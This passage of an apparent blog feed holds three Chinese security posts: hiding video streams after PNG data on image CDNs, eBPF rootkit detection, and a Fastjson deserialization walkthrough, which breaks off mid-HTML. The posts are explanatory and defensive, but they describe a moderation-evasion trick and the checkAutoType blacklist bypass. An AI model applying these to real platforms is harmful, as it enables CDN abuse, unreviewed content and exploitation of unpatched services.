            "content_html": "<h1 id=\"简介\">简介</h1><p>最近 OSS 桶相关发现了一个很有意思的小问题，简单做个记录，怕忘记了</p><h1 id=\"影响\">影响</h1><p>本身，这个可以算作一个没有什么危害的 “漏洞”，如果你提交到 SRC 的话，大概率会获得到一个低危甚至忽略。本身来说，这个问题确实也算不上什么安全问题，但是实际上会带来更广的影响</p><h1 id=\"问题描述\">问题描述</h1><p>每家都会有提供或者使用类似 OSS 服务的情况，使用方式非常简单，通常用户上传图片，平台侧前置了 CDN 给供用户访问图片。但是我们发现了一些，很有意思的现象，<strong>PNG图片可以当视频播放</strong></p><p>但是往往，这种问题不会直接暴露出现，因为图片的上传会有压缩、水印等处理，<strong>在图片受到影响或者破坏的情况下，该问题默认不存在</strong></p><p>那么他们是如何做到的呢？</p><h2 id=\"了解-png\">了解 PNG</h2><blockquote>  <p>PNG，全称为 Portable Network Graphics，是一种支持无损压缩的位图图形格式，支持索引、灰度、RGB三种颜色方案以及以及Alpha通道等特性。</p></blockquote><blockquote>  <p>另外这个适用于不止 PNG，未压缩的 JPG 这些同理</p></blockquote><p>大部分的格式等，都可以从 <a href=\"https://zh.wikipedia.org/wiki/PNG\">wikipedia</a> 中发现问题的答案，以及我随手翻阅的 <a href=\"https://blog.mythsman.com/post/5d2d62b4a2005d74040ef7eb/\">博客</a>，有以下四个数据块</p><ul>  <li>文件头数据块IHDR（header chunk）：包含有图像基本信息，作为第一个数据块出现并只出现一次。</li>  <li>调色板数据块PLTE（palette chunk）：必须放在图像数据块之前。</li>  <li>图像数据块IDAT（image data chunk）：存储实际图像数据。PNG数据允许包含多个连续的图像数据块。</li>  <li>图像结束数据IEND（image trailer chunk）：放在文件尾部，表示PNG数据流结束。</li></ul><p>简单来说，PNG 由文件署名和数据块两部分组成。常见的以 <code class=\"language-plaintext highlighter-rouge\">8950 4e47 0d0a 1a0a</code> 开头，<code class=\"language-plaintext highlighter-rouge\">00 00 00 00 49 45 4E 44 AE 42 60 82</code> 结尾的 IEND 数据块。通常情况下，解析图片只会解析到 IEND，而在 IEND 之后的数据是不会被图片解析的。如上面博客提到的，可以做数据隐藏，那么这有什么意义吗？</p><p>在实际场景中还真有利用的</p><h2 id=\"视频流\">视频流</h2><blockquote>  <p>在图片后面，添加一个兼容性很强的数据（数据格式），不会因为开头的一些”脏数据” 而影响使用，存在吗？答：视频流</p></blockquote><p>因为这当中涉及到一些视频流相关的，作者不是这方面的专家，所以不做过多原理的解释。详见 <a href=\"https://zh.wikipedia.org/wiki/MPEG2-TS\">wikipedia</a></p><p>直接在PNG图后拼接 0x47(G) + 188byte 数据，每次会从同步字节开始解析。在 PNG 开头的情况下，直接拼接视频流。甚至可以这么操作：</p><p><code class=\"language-plaintext highlighter-rouge\">curl http://xxxx/test.png -o test.mpeg</code></p><p>直接播放就完了</p><h2 id=\"实际利用\">实际利用</h2><p>那么实际场景下，直接拼接一个大的视频，那不是太明显了吗？是的，所以有另外的办法，拼接一下放到 m3u8 即可。m3u8 相当于就是一个播放 list，每一个图片放几秒，拼接 小时级别的 电影，根本没啥问题。也就是一些自建视频站，能够开下去的原因，因为能够在线播放，还不用出 CDN 费用，有的时候会卡卡的，可能是资源被限速了…</p><h2 id=\"危害\">危害</h2><ol>  <li>CDN 资源浪费，资源费用增长</li>  <li>资源内容不受控制，因为本身会被当作 PNG 解析，不会审核视频内容（内容安全/严重）</li></ol><h2 id=\"其他\">其他</h2><p>当然还有更花的…先不做公开了给个 demo，<code class=\"language-plaintext highlighter-rouge\">curl https://chriskaliX.github.io/assets/imgs/test.jpg -o test.mpeg</code></p>",
            "url": "https://chriskalix.github.io/2022/11/11/oss-related",
            
            
            
            
            
            "date_published": "2022-11-11T00:00:00+01:00",
            "date_modified": "2022-11-11T00:00:00+01:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/10/27/linux-rootkit-detection",
            "title": "Linux Rootkit Detection",
            "summary": "Linux Rootkit Detection",
            "content_text": "文章基于 tyton 做研究学习简介之前几篇文章很潦草的介绍了一下内核后门的行为，包括不限于隐藏文件、隐藏进程、网络隐藏、knock式后门等等。Elkeid 中就采用了 tyton 中的一些模块，来做 rootkit 的检测，主要是基于行为。在阿里云的文档中，提供的 Rootkit 检测方案似乎是基于内存取证，这块了解较少，暂时不做深入检测方式 &amp; eBPF 代码编写思路Hidden Kernel Module Detection常见的方式，从 lsmod 或者 /proc/modules 的结果移除的方式。lsmod 本质上就是从一个内核模块链表的遍历打印，我们写一个简单内核模块，通过 list_entry 的方式去遍历获取。简单的隐蔽方式为：从 list 中，将当前模块移除，通常情况下会保留这个 list.pre 的地址，通过 list_add 的方式再将其添加回列表在 tyton 中，通过循环便利 mod_kset-&gt;list，找出每个 kobj 中的 module，是否能通过 find_module 的形式获取的到。在 eBPF 中，这种两个循环嵌套的方式往往很容易超出指令数(100w)，因为不支持 endless loop，我们需要通过展开的方式。作为初步的解决方法，我们在一次展开后只进行计数，并与用户态进行对比。这个方法目前看来处于一个能用的状态，但是无法获取到是哪个模块隐藏了（其实也可以，稍微改一下内核代码做比对即可）当然这个检测方法也是相对比较辅助的，因为这种从 kobj 的方式，也可以和擦除链表一样，通过 kobject_del 删除的方式进行规避。用 Elkeid 做了一个简单的测试：  Github 上搜索一个 demo: https://github.com/hoyleeson/toolkit (建议稍微改一下，留一个删除的后门)  insmod hids_driver.ko，用elkeid_decoder做简单的解码使用  同时安装上 reptile 以及上述 toolkit 中的 kmod_hidden检出结果如下{\"data_type\":\"hidden_kernel_module\",\"module_name\":\"reptile_module\"}{\"data_type\":\"hidden_kernel_module\",\"module_name\":\"reptile_module\"}Hades 中的检出和这个一样，都是基于 tyton 的，这个函数功能对于 kobject_del 的内核模块是不检出的。大多数的文章和分析基本是停止到这里，我很好奇如果一个内核模块摘除了 list，摘除了 kobject，就完全无法检出了吗？问了一下群友，得到宝贵的文章2以及一个用于测试的例子我们先看一下隐藏是如何做到的4，我们遗漏了：  /proc/vmallocinfo 中的隐藏，摘除 vmalloc 调用关系链  摘除依赖关系，nf_conntrack holder 隐藏甚至直接去 cat /proc/vmallocinfo，能看到 reptile_module 的 khook_init 地址如何找出这些似乎完全隐藏的模块呢？作者的答案是：扫描modules内存区间，page依然还在，通过暴力检索内存地址内的 module 来发现隐藏的模块。我的理解是，模块加载后总是会开辟内存空间，不论如何从各种链表中擦除自身痕迹，内存不会骗人…TODO: unfinished hereIDT/SCT Hook Detection这个其实比较简单，在 Hades 中的方法和 tracee 一样，通过 /proc/kallsyms 的地址和内核态中 sys_call_table / idt_table 地址进行比对能够检测出如 Diamorphine 这一类 hook 了系统调用的。但是对于 KHOOK 这种框架的，如 Reptile，在 tyton 项目的 issue 里也能看到有人提问，大致意思是当前无法检出 KHOOK 框架的 hook，因为他不修改 syscall 的函数指向，而是在指向的函数开头插入 asm code 来做JUMP正如 tyton 官网的文档里，对于 Reptile 的 SCT/IDT Hooking 行为，结果是 EvadedNetfilter Hook Detectionnetfilter 也常被用作蜜罐，也能作为 knock 式后门的一环，这里暂时 pending，在 Reptile 以及 Diamorphine 中都使用了这个作为 knock 的方法Network protocol Hook DetectionpendingProcess File Operations Hook Detection这个可以支持，主要是通过 filp_open 打开 “/proc”，然后比对 fp-&gt;f_op-&gt;iterate 所指向的是否为 kernel text 区。隐藏 PID 也可以 sys_getdents3，近期会开始写一下这个，tracee 下是通过 hook security_file_permission，看下是否能做成 trigger 的形式（害怕全量 hook 会有一定影响）其余思路  因为 HIDS 总是先行部署，通过 hook init_module 总能发现 LKM 的加载  BPF 程序后门没有在上述的讨论中，其实可观测的方式也有很多，包括不限于 hook，/proc/vmallocinfo 等，且总是依赖一个用户态进程  内存扫描/镜像参考  https://xcellerator.github.io/posts/linux_rootkits_05/  https://blog.csdn.net/dog250/article/details/106064940  https://xcellerator.github.io/posts/linux_rootkits_07/  https://blog.csdn.net/dog250/article/details/106023941",
            "content_html": "<p>文章基于 <a href=\"https://nbulischeck.github.io/tyton/\">tyton</a> 做研究学习</p><h1 id=\"简介\">简介</h1><p>之前几篇文章很潦草的介绍了一下内核后门的行为，包括不限于隐藏文件、隐藏进程、网络隐藏、knock式后门等等。Elkeid 中就采用了 tyton 中的一些模块，来做 rootkit 的检测，主要是基于行为。在阿里云的文档中，提供的 Rootkit 检测方案似乎是基于内存取证，这块了解较少，暂时不做深入</p><h1 id=\"检测方式--ebpf-代码编写思路\">检测方式 &amp; eBPF 代码编写思路</h1><h2 id=\"hidden-kernel-module-detection\">Hidden Kernel Module Detection</h2><p>常见的方式，从 lsmod 或者 /proc/modules 的结果移除的方式。lsmod 本质上就是从一个内核模块链表的遍历打印，我们写一个简单内核模块，通过 list_entry 的方式去遍历获取。简单的隐蔽方式为：从 list 中，将当前模块移除，通常情况下会保留这个 list.pre 的地址，通过 list_add 的方式再将其添加回列表</p><p><img src=\"https://nbulischeck.github.io/tyton/images/kset.svg\" alt=\"\" /></p><p>在 tyton 中，通过循环便利 mod_kset-&gt;list，找出每个 kobj 中的 module，是否能通过 find_module 的形式获取的到。在 eBPF 中，这种两个循环嵌套的方式往往很容易超出指令数(100w)，因为不支持 endless loop，我们需要通过展开的方式。作为初步的解决方法，我们在一次展开后只进行计数，并与用户态进行对比。这个方法目前看来处于一个能用的状态，但是无法获取到是哪个模块隐藏了（其实也可以，稍微改一下内核代码做比对即可）</p><p>当然这个检测方法也是相对比较辅助的，因为这种从 kobj 的方式，也可以和擦除链表一样，通过 kobject_del 删除的方式进行规避。用 Elkeid 做了一个简单的测试：</p><ol>  <li>Github 上搜索一个 demo: https://github.com/hoyleeson/toolkit (建议稍微改一下，留一个删除的后门)</li>  <li>insmod hids_driver.ko，用elkeid_decoder做简单的解码使用</li>  <li>同时安装上 reptile 以及上述 toolkit 中的 kmod_hidden</li></ol><p>检出结果如下</p><div class=\"language-json highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">{</span><span class=\"nl\">\"data_type\"</span><span class=\"p\">:</span><span class=\"s2\">\"hidden_kernel_module\"</span><span class=\"p\">,</span><span class=\"nl\">\"module_name\"</span><span class=\"p\">:</span><span class=\"s2\">\"reptile_module\"</span><span class=\"p\">}</span><span class=\"w\"></span><span class=\"p\">{</span><span class=\"nl\">\"data_type\"</span><span class=\"p\">:</span><span class=\"s2\">\"hidden_kernel_module\"</span><span class=\"p\">,</span><span class=\"nl\">\"module_name\"</span><span class=\"p\">:</span><span class=\"s2\">\"reptile_module\"</span><span class=\"p\">}</span><span class=\"w\"></span></code></pre></div></div><p>Hades 中的检出和这个一样，都是基于 tyton 的，这个函数功能对于 kobject_del 的内核模块是不检出的。大多数的文章和分析基本是停止到这里，我很好奇如果一个内核模块摘除了 list，摘除了 kobject，就完全无法检出了吗？问了一下群友，得到宝贵的文章<a href=\"https://blog.csdn.net/dog250/article/details/106064940\">2</a>以及一个用于测试的<a href=\"https://github.com/sysprog21/lkm-hidden/blob/master/main.c\">例子</a></p><p>我们先看一下隐藏是如何做到的<a href=\"https://blog.csdn.net/dog250/article/details/106023941\">4</a>，我们遗漏了：</p><ol>  <li>/proc/vmallocinfo 中的隐藏，摘除 vmalloc 调用关系链</li>  <li>摘除依赖关系，nf_conntrack holder 隐藏</li></ol><p>甚至直接去 cat /proc/vmallocinfo，能看到 reptile_module 的 khook_init 地址</p><p>如何找出这些似乎完全隐藏的模块呢？</p><p>作者的答案是：扫描modules内存区间，page依然还在，通过暴力检索内存地址内的 module 来发现隐藏的模块。我的理解是，模块加载后总是会开辟内存空间，不论如何从各种链表中擦除自身痕迹，内存不会骗人…</p><p>TODO: unfinished here</p><h2 id=\"idtsct-hook-detection\">IDT/SCT Hook Detection</h2><p>这个其实比较简单，在 Hades 中的方法和 tracee 一样，通过 /proc/kallsyms 的地址和内核态中 sys_call_table / idt_table 地址进行比对能够检测出如 <code class=\"language-plaintext highlighter-rouge\">Diamorphine</code> 这一类 hook 了系统调用的。但是对于 KHOOK 这种框架的，如 Reptile，在 tyton 项目的 issue 里也能看到有人提问，大致意思是当前无法检出 KHOOK 框架的 hook，因为他不修改 syscall 的函数指向，而是在指向的函数开头插入 asm code 来做JUMP</p><p>正如 tyton 官网的文档里，对于 Reptile 的 SCT/IDT Hooking 行为，结果是 Evaded</p><h2 id=\"netfilter-hook-detection\">Netfilter Hook Detection</h2><p>netfilter 也常被用作蜜罐，也能作为 knock 式后门的一环，这里暂时 pending，在 Reptile 以及 Diamorphine 中都使用了这个作为 knock 的方法</p><h2 id=\"network-protocol-hook-detection\">Network protocol Hook Detection</h2><p>pending</p><h2 id=\"process-file-operations-hook-detection\">Process File Operations Hook Detection</h2><p>这个可以支持，主要是通过 filp_open 打开 “/proc”，然后比对 fp-&gt;f_op-&gt;iterate 所指向的是否为 kernel text 区。隐藏 PID 也可以 sys_getdents<a href=\"https://xcellerator.github.io/posts/linux_rootkits_07/\">3</a>，近期会开始写一下这个，tracee 下是通过 hook security_file_permission，看下是否能做成 trigger 的形式（害怕全量 hook 会有一定影响）</p><h1 id=\"其余思路\">其余思路</h1><ol>  <li>因为 HIDS 总是先行部署，通过 hook init_module 总能发现 LKM 的加载</li>  <li>BPF 程序后门没有在上述的讨论中，其实可观测的方式也有很多，包括不限于 hook，/proc/vmallocinfo 等，且总是依赖一个用户态进程</li>  <li>内存扫描/镜像</li></ol><h1 id=\"参考\">参考</h1><ul>  <li>https://xcellerator.github.io/posts/linux_rootkits_05/</li>  <li>https://blog.csdn.net/dog250/article/details/106064940</li>  <li>https://xcellerator.github.io/posts/linux_rootkits_07/</li>  <li>https://blog.csdn.net/dog250/article/details/106023941</li></ul>",
            "url": "https://chriskalix.github.io/2022/10/27/linux-rootkit-detection",
            
            
            
            
            
            "date_published": "2022-10-27T00:00:00+02:00",
            "date_modified": "2022-10-27T00:00:00+02:00",
            
                "author":  {
                "name": "chriskali",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://chriskalix.github.io/2022/09/13/java-security",
            "title": "Java 安全小计",
            "summary": "Java 安全小计",
            "content_text": "写在前面之前写过一篇 Java 安全学习笔记，记的比较乱，原先的文字版也由于没有维护找不到了，遂重新记录一下，有很老的漏洞，也有稍微新一点的，结合实际工作中碰到的一些问题，作为学习记录漏洞记录Fastjson  Fastjson 是 Java 很著名的一个漏洞系列，但是时间一长很容易忘记，重新记录作为备忘。这回记录的尽量简单明了一点1.2.24Fastjson 漏洞首次出现，也是最经典的 @type 字段首次出现，简单的 POC 如下import com.alibaba.fastjson.JSON;public class Fastjson_1_2_24 {    public static class Test {        private String id;        Test() {            System.out.println(\"I am the test\");        }        public void setId(String ids){            System.out.println(\"setId go\");            this.id=ids;        }        public String getId(){            System.out.println(\"GetId go\");            return this.id;        }    }    public static void main(String[] args) {        JSON.parseObject(\"{\\\"@type\\\":\\\"fastjson.Fastjson_1_2_24$Test\\\",\\\"id\\\":\\\"123\\\"}\");    }}断点打在类初始化，能看到调用堆栈，记录一些关键点首先json是从左向右解析，LBRACE 就是 {case LBRACE:    JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));    return parseObject(object, fieldName);之后进入长长的 parseObject，parseObject 可以简单的看为循环的对每一个字段做解析，例如片段，对 key/value 做处理，特殊点就在于// JSON.DEFAULT_TYPE_KEY = @typeif (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {    String typeName = lexer.scanSymbol(symbolTable, '\"');    // mark    Class&lt;?&gt; clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());    if (clazz == null) {        object.put(JSON.DEFAULT_TYPE_KEY, typeName);        continue;    }    lexer.nextToken(JSONToken.COMMA);    if (lexer.token() == JSONToken.RBRACE) {        lexer.nextToken(JSONToken.COMMA);        try {            Object instance = null;            ObjectDeserializer deserializer = this.config.getDeserializer(clazz);            if (deserializer instanceof JavaBeanDeserializer) {                instance = ((JavaBeanDeserializer) deserializer).createInstance(this, clazz);            }            if (instance == null) {                if (clazz == Cloneable.class) {                    instance = new HashMap();                } else if (\"java.util.Collections$EmptyMap\".equals(typeName)) {                    instance = Collections.emptyMap();                } else {                    instance = clazz.newInstance();                }            }            return instance;        } catch (Exception e) {            throw new JSONException(\"create instance error\", e);        }    }    ...    ObjectDeserializer deserializer = config.getDeserializer(clazz);    return deserializer.deserialze(this, clazz, fieldName);}一个分界点就是在 loadClass 这个部分，后续会在类加载这部分做文章，后续利用和类加载先不在这儿讨论（RMI/LDAP…）1.2.47后续，出现了对这种任意类加载的检查机制，同样在类加载的时候，多了一个 checkAutoTypeif (object != null        &amp;&amp; object.getClass().getName().equals(typeName)) {    clazz = object.getClass();} else {    clazz = config.checkAutoType(typeName, null, lexer.getFeatures());}// 引入了对应的黑名单机制，顺便还给加了一下密if (clazz == null) {    clazz = TypeUtils.getClassFromMapping(typeName);//将typeName作为key从mappings(ConcurrentMap对象)中查找对象,这个相当于从cache取值，刚开始没有存入对象，取出值为null}// 这里给入 java.lang.classif (clazz == null) {    clazz = deserializers.findClass(typeName);// 将typeName作为key从deserializers(IdentityHashMap)中查找对象}if (clazz != null) {    if (expectClass != null            &amp;&amp; clazz != java.util.HashMap.class            &amp;&amp; !expectClass.isAssignableFrom(clazz)) {        throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName());    }    return clazz;}if (!autoTypeSupport) {//判断提取的对象hash值是否在denyHashCodes，也就是黑名单过滤    long hash = h3;    for (int i = 3; i &lt; className.length(); ++i) {        char c = className.charAt(i);        hash ^= c;        hash *= PRIME;        if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) {            throw new JSONException(\"autoType is not support. \" + typeName);        }        if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {            if (clazz == null) {                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);            }            if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {                throw new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName());            }            return clazz;        }    }}if (clazz == null) {    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);}//省略部分代码return clazz;其实跟之前不一样，需要有两个键值对的方式，就是因为要使用 mapping 缓存机制，在第一次循环的时候把恶意这个类给加载到缓存，在第二次运行到 getClassFromMapping 的时候，就直接返回了，绕过了下面的黑名单检查（虽然黑名单检查本身就不对…）1.2.68持续最长的一个问题，当然除了 1.2.83 的 Throwable 不算。黑名单的绕过机制，基于 java.lang.AutoCloseable…修复  修复是一个大问题，有时候并不是想的那么简单…因为公司内部有标准的发布系统，根据发布卡点 + 内部排查，版本限制并不是一个大问题，当然也有例外大数据系统  大数据有很多自编写的 UDF，在/离线任务，这些不经过发布系统。还有一些很老的边缘系统，通过 Nginx 直接转发到后端应用，通过梳理 nginx config，统一排查根据 google/log4jscanner 魔改了一下，做了一个 jar 包的扫描，排除了一下历史上的问题。这个很通用，我们把历史的一些（包括 log4j）的都添加到规则内，对上传的 jar 包做检查safemode理论上升级到 68 以上，基本没有危害（Throwable 的 83也有问题，不过也有一定条件，还行）。但是，由于 inet4 还是会出网，有段时间收到 CERT 的一个整改，就是因为有人扫 inet 收到 DNS 请求，说有 fastjson 漏洞了，需要整改…其实在线上 DNS 告警中，我们看到了这个，当时不认为有利用价值，CERT 认为有，所以一咬牙我们开始推行 safemode，整个过程中还是会有个别问题… TODO黑白盒检测",
            "content_html": "<h2 id=\"写在前面\">写在前面</h2><p>之前写过一篇 Java <a href=\"https://chriskaliX.github.io/assets/imgs/java_security_old.pdf\">安全学习笔记</a>，记的比较乱，原先的文字版也由于没有维护找不到了，遂重新记录一下，有很老的漏洞，也有稍微新一点的，结合实际工作中碰到的一些问题，作为学习记录</p><h2 id=\"漏洞记录\">漏洞记录</h2><h3 id=\"fastjson\">Fastjson</h3><blockquote>  <p>Fastjson 是 Java 很著名的一个漏洞系列，但是时间一长很容易忘记，重新记录作为备忘。这回记录的尽量简单明了一点</p></blockquote><h4 id=\"1224\">1.2.24</h4><p>Fastjson 漏洞首次出现，也是最经典的 <code class=\"language-plaintext highlighter-rouge\">@type</code> 字段首次出现，简单的 POC 如下</p><div class=\"language-java highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">import</span> <span class=\"nn\">com.alibaba.fastjson.JSON</span><span class=\"o\">;</span><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Fastjson_1_2_24</span> <span class=\"o\">{</span>    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">Test</span> <span class=\"o\">{</span>        <span class=\"kd\">private</span> <span class=\"nc\">String</span> <span class=\"n\">id</span><span class=\"o\">;</span>        <span class=\"nc\">Test</span><span class=\"o\">()</span> <span class=\"o\">{</span>            <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">\"I am the test\"</span><span class=\"o\">);</span>        <span class=\"o\">}</span>        <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">setId</span><span class=\"o\">(</span><span class=\"nc\">String</span> <span class=\"n\">ids</span><span class=\"o\">){</span>            <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">\"setId go\"</span><span class=\"o\">);</span>            <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">=</span><span class=\"n\">ids</span><span class=\"o\">;</span>        <span class=\"o\">}</span>        <span class=\"kd\">public</span> <span class=\"nc\">String</span> <span class=\"nf\">getId</span><span class=\"o\">(){</span>            <span class=\"nc\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">\"GetId go\"</span><span class=\"o\">);</span>            <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">id</span><span class=\"o\">;</span>        <span class=\"o\">}</span>    <span class=\"o\">}</span>    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"nc\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>        <span class=\"no\">JSON</span><span class=\"o\">.</span><span class=\"na\">parseObject</span><span class=\"o\">(</span><span class=\"s\">\"{\\\"@type\\\":\\\"fastjson.Fastjson_1_2_24$Test\\\",\\\"id\\\":\\\"123\\\"}\"</span><span class=\"o\">);</span>    <span class=\"o\">}</span><span class=\"o\">}</span></code></pre></div></div><p>断点打在类初始化，能看到调用堆栈，记录一些关键点</p><p>首先json是从左向右解析，LBRACE 就是 <code class=\"language-plaintext highlighter-rouge\">{</code></p><div class=\"language-java highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">case</span> <span class=\"nl\">LBRACE:</span>    <span class=\"nc\">JSONObject</span> <span class=\"n\">object</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">JSONObject</span><span class=\"o\">(</span><span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">isEnabled</span><span class=\"o\">(</span><span class=\"nc\">Feature</span><span class=\"o\">.</span><span class=\"na\">OrderedField</span><span class=\"o\">));</span>    <span class=\"k\">return</span> <span class=\"nf\">parseObject</span><span class=\"o\">(</span><span class=\"n\">object</span><span class=\"o\">,</span> <span class=\"n\">fieldName</span><span class=\"o\">);</span></code></pre></div></div><p>之后进入长长的 <code class=\"language-plaintext highlighter-rouge\">parseObject</code>，<code class=\"language-plaintext highlighter-rouge\">parseObject</code> 可以简单的看为循环的对每一个字段做解析，例如片段，对 key/value 做处理，特殊点就在于</p><div class=\"language-java highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// JSON.DEFAULT_TYPE_KEY = @type</span><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">key</span> <span class=\"o\">==</span> <span class=\"no\">JSON</span><span class=\"o\">.</span><span class=\"na\">DEFAULT_TYPE_KEY</span> <span class=\"o\">&amp;&amp;</span> <span class=\"o\">!</span><span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">isEnabled</span><span class=\"o\">(</span><span class=\"nc\">Feature</span><span class=\"o\">.</span><span class=\"na\">DisableSpecialKeyDetect</span><span class=\"o\">))</span> <span class=\"o\">{</span>    <span class=\"nc\">String</span> <span class=\"n\">typeName</span> <span class=\"o\">=</span> <span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">scanSymbol</span><span class=\"o\">(</span><span class=\"n\">symbolTable</span><span class=\"o\">,</span> <span class=\"sc\">'\"'</span><span class=\"o\">);</span>    <span class=\"c1\">// mark</span>    <span class=\"nc\">Class</span><span class=\"o\">&lt;?&gt;</span> <span class=\"n\">clazz</span> <span class=\"o\">=</span> <span class=\"nc\">TypeUtils</span><span class=\"o\">.</span><span class=\"na\">loadClass</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">,</span> <span class=\"n\">config</span><span class=\"o\">.</span><span class=\"na\">getDefaultClassLoader</span><span class=\"o\">());</span>    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>        <span class=\"n\">object</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"no\">JSON</span><span class=\"o\">.</span><span class=\"na\">DEFAULT_TYPE_KEY</span><span class=\"o\">,</span> <span class=\"n\">typeName</span><span class=\"o\">);</span>        <span class=\"k\">continue</span><span class=\"o\">;</span>    <span class=\"o\">}</span>    <span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">nextToken</span><span class=\"o\">(</span><span class=\"nc\">JSONToken</span><span class=\"o\">.</span><span class=\"na\">COMMA</span><span class=\"o\">);</span>    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">token</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"nc\">JSONToken</span><span class=\"o\">.</span><span class=\"na\">RBRACE</span><span class=\"o\">)</span> <span class=\"o\">{</span>        <span class=\"n\">lexer</span><span class=\"o\">.</span><span class=\"na\">nextToken</span><span class=\"o\">(</span><span class=\"nc\">JSONToken</span><span class=\"o\">.</span><span class=\"na\">COMMA</span><span class=\"o\">);</span>        <span class=\"k\">try</span> <span class=\"o\">{</span>            <span class=\"nc\">Object</span> <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>            <span class=\"nc\">ObjectDeserializer</span> <span class=\"n\">deserializer</span> <span class=\"o\">=</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">config</span><span class=\"o\">.</span><span class=\"na\">getDeserializer</span><span class=\"o\">(</span><span class=\"n\">clazz</span><span class=\"o\">);</span>            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">deserializer</span> <span class=\"k\">instanceof</span> <span class=\"nc\">JavaBeanDeserializer</span><span class=\"o\">)</span> <span class=\"o\">{</span>                <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"o\">((</span><span class=\"nc\">JavaBeanDeserializer</span><span class=\"o\">)</span> <span class=\"n\">deserializer</span><span class=\"o\">).</span><span class=\"na\">createInstance</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">,</span> <span class=\"n\">clazz</span><span class=\"o\">);</span>            <span class=\"o\">}</span>            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">instance</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">clazz</span> <span class=\"o\">==</span> <span class=\"nc\">Cloneable</span><span class=\"o\">.</span><span class=\"na\">class</span><span class=\"o\">)</span> <span class=\"o\">{</span>                    <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">HashMap</span><span class=\"o\">();</span>                <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"s\">\"java.util.Collections$EmptyMap\"</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">typeName</span><span class=\"o\">))</span> <span class=\"o\">{</span>                    <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"nc\">Collections</span><span class=\"o\">.</span><span class=\"na\">emptyMap</span><span class=\"o\">();</span>                <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>                    <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"n\">clazz</span><span class=\"o\">.</span><span class=\"na\">newInstance</span><span class=\"o\">();</span>                <span class=\"o\">}</span>            <span class=\"o\">}</span>            <span class=\"k\">return</span> <span class=\"n\">instance</span><span class=\"o\">;</span>        <span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"nc\">Exception</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>            <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"nf\">JSONException</span><span class=\"o\">(</span><span class=\"s\">\"create instance error\"</span><span class=\"o\">,</span> <span class=\"n\">e</span><span class=\"o\">);</span>        <span class=\"o\">}</span>    <span class=\"o\">}</span>    <span class=\"o\">...</span>    <span class=\"nc\">ObjectDeserializer</span> <span 